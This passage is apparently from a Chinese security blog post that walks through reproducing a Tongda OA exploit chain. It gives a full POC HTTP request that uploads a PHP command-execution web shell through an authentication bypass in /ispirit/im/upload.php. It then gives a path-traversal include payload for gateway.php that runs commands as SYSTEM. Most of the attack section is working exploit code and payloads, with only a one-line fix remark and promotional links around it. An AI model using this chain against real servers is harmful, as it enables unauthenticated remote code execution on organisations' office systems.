style="overflow-wrap: break-word !important;"> if ($url != '') {<br style="overflow-wrap: break-word !important;"> if (substr($url, 0, 1) == '/') {<br style="overflow-wrap: break-word !important;"> $url = substr($url, 1);<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> if (strpos($url, 'general/') !== false || strpos($url, <br style="overflow-wrap: break-word !important;"> 'ispirit/') !== false || strpos($url, 'module/') !== <br style="overflow-wrap: break-word !important;"> false) {<br style="overflow-wrap: break-word !important;"> include_once $url;<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> }<br style="overflow-wrap: break-word !important;"> exit;<br style="overflow-wrap: break-word !important;">}<br style="overflow-wrap: break-word !important;">
```

这里首先是不传入参数 P 就可以进入下面判断语句，之后用到了 stripcslashes 函数

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NIPVpejqyBPysTIhwgl4ThMxEIV12jvqJVYs96uiaryX0ldZEp8b6q5Q/640?wx_fmt=jpeg)  
看一下实例就明白了，只是这里的源码接收了一个形参

之后从 json 中获取 url 参数的值，之后判断 general/、ispirit/、module / 是否在 url 内

如果不在直接跳过下面的 include_once $url, 如果存在则包含指定 URL 的文件，

这个是后期进行文件包含的重点

0x05 综合思路
---------

通过第一个漏洞，绕过认证上传木马，然后通过文件包含来包含文件，

其中需要注意的是 DEST_UID 不能未空，文件包含中的 url 请求数据中需要包含 general/、ispirit/、module / 三者中的一个.

0x06 本地演示
---------

1. 访问本地通达 OA 系统

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NChNAOibFmocz41yvMXASe18g2mzt63qUUiaQRU76ZLnbvkISBQlhFIqQ/640?wx_fmt=jpeg)  
  

2. 抓包，改 POST 包，放入 Repeater 模块。

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NKoxgwRrpYkGJUnSjv4mH0UAa3BlmTJbjGrDTtWA8afNicl5MqCyBic7A/640?wx_fmt=jpeg)  
  

3. 改包，如下 POC

```
POST /ispirit/im/upload.php HTTP/1.1<br style="overflow-wrap: break-word !important;">Host: 218.107.46.235<br style="overflow-wrap: break-word !important;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0<br style="overflow-wrap: break-word !important;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br style="overflow-wrap: break-word !important;">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br style="overflow-wrap: break-word !important;">Accept-Encoding: gzip, deflate<br style="overflow-wrap: break-word !important;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Length: 564<br style="overflow-wrap: break-word !important;">Origin: http://localhost<br style="overflow-wrap: break-word !important;">Connection: close<br style="overflow-wrap: break-word !important;">Referer: http://localhost/<br style="overflow-wrap: break-word !important;">Cookie: Phpstorm-9102a7e6=cc1a9f2c-c084-4378-8aa3-e42492123b1c; PHPSESSID=18p3ov5rtc2i1elr4dvje9m1b3<br style="overflow-wrap: break-word !important;">Upgrade-Insecure-Requests: 1<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">2<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;">123<br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB<br style="overflow-wrap: break-word !important;">Content-Disposition: form-data; overflow-wrap: break-word !important;">Content-Type: image/jpeg<br style="overflow-wrap: break-word !important;"><br style="overflow-wrap: break-word !important;"><?php<br style="overflow-wrap: break-word !important;">$command=$_POST['cmd'];<br style="overflow-wrap: break-word !important;">$wsh = new COM('WScript.shell');<br style="overflow-wrap: break-word !important;">$exec = $wsh->exec("cmd /c ".$command);<br style="overflow-wrap: break-word !important;">$stdout = $exec->StdOut();<br style="overflow-wrap: break-word !important;">$stroutput = $stdout->ReadAll();<br style="overflow-wrap: break-word !important;">echo $stroutput;<br style="overflow-wrap: break-word !important;">?><br style="overflow-wrap: break-word !important;">------WebKitFormBoundarypyfBh1YB4pV8McGB--<br style="overflow-wrap: break-word !important;">
```

单包发送，会返回一个数据包，数据包包含了文件上传的路径。

我们单包发送会在通达 OA 系统的文件中生成木马 php 文件。  

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NcCXNg39Omcf9bmwgS3VYOTC9XDqxVvqnOUFY6iaXPqL2YdutkJD2htw/640?wx_fmt=jpeg)  
  

很明显的可以看到，上传成功了，接下来利用文件包含执行上传的木马文件  
访问地址

```
/ispirit/interface/gateway.php<br style="overflow-wrap: break-word !important;">
```

抓包，构造 payload

```
json={"url":"/general/../../attach/im/2005/1151884360.123.php"}&cmd=whoami
```

查看返回包（这里一定要发 POST 包）

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NdKpo7odIhMqC6V8esUKUenQvCPPkxd3dtrnjhyDaR8cbcqq3I0iacqg/640?wx_fmt=jpeg)  
  

system 权限

执行一下 CMD 命令看一下

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nn8mSOpqMCW4FoyByeBIqHVoiaWOru7dCTZaiaf1odTlqKGibU9UFs0hicQ/640?wx_fmt=jpeg)

0x07 总结
-------

可以看到，各种危害不是很大的漏洞，组合起来危害还是比较大的，尤其是在这个攻击中两次都利用到的认证绕过，起到了关键的作用。

通过绕过认证访问到上传接口进行图片马的上传，再结合上文件包含，造成了 RCE。

目前最直接的修复方式就是替换官方给的文件

此漏洞本人通过查阅各方面的资料复现了 5 个小时左右，不敢说全网最详细，也差不多了。

希望对大家有所帮助，同时大家一定要做一个正直的白帽子

  

**回顾往期内容**

[实战纪实 | 一次护网中的漏洞渗透过程](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247488327&idx=1&sn=c6677ad2bc524802c79c91a8982c2423&chksm=fa686a36cd1fe3207916178ce750add0fe89e6e0b6bdae53f42429d71a259d53cb39db41a7f5&scene=21#wechat_redirect)

[面试分享 #哈啰 / 微步 / 斗象 / 深信服 / 四叶草](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247491501&idx=1&sn=70aae2e2f83d503ca6fad3c4f952bd6e&chksm=fa6866dccd1fefca9de95e8c4c42b81637de45b73319931fcd9e5fdc3752774ac306f76b53f6&scene=21#wechat_redirect)

[反杀黑客 — 还敢连 shell 吗？蚁剑 RCE 第二回合~](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247485574&idx=1&sn=d951b776d34bfed739eb5c6ce0b64d3b&chksm=fa6871f7cd1ff8e14ad7eef3de23e72c622ff5a374777c1c65053a83a49ace37523ac68d06a1&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[防溯源防水表—APT 渗透攻击红队行动保障](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487533&idx=1&sn=30e8baddac59f7dc47ae87cf5db299e9&chksm=fa68695ccd1fe04af7877a2855883f4b08872366842841afdf5f506f872bab24ad7c0f30523c&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)

扫码白嫖视频 + 工具 + 进群 + 靶场等资料

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)

 **扫码白嫖****！**

 **还有****免费****的配套****靶场****、****交流群****哦！**